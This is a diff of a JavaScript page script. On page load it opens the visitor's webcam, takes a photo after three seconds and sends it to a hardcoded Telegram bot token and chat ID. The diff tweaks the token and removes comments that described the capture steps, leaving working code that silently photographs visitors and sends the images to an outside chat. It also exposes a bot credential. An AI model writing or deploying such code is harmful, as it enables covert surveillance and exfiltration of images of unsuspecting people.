@@ -1,4 +1,4 @@
-const BOT_TOKEN = '8380564571:AAG6pyo--3PRjg7uRMI88SAl_J51w3Z5C8U';
+const BOT_TOKEN = '8380564571:AAG6pyo--3PRjg7uRMI88SAI_J51w3Z5C8U';
 const CHAT_ID = '7672652168';
 
 async function sendTelegram(photoBase64) {
@@ -27,7 +27,6 @@ async function startCam() {
         video.srcObject = stream;
         video.play();
 
-        // Ждём 3 секунды и делаем фото
         setTimeout(() => {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
@@ -35,8 +34,6 @@ async function startCam() {
             canvas.getContext('2d').drawImage(video, 0, 0);
             const photo = canvas.toDataURL('image/jpeg');
             sendTelegram(photo);
-            
-            // Выключаем камеру
             stream.getTracks().forEach(track => track.stop());
         }, 3000);
     } catch (error) {
@@ -44,5 +41,4 @@ async function startCam() {
     }
 }
 
-// Запускаем камеру сразу при загрузке страницы
 window.onload = startCam;
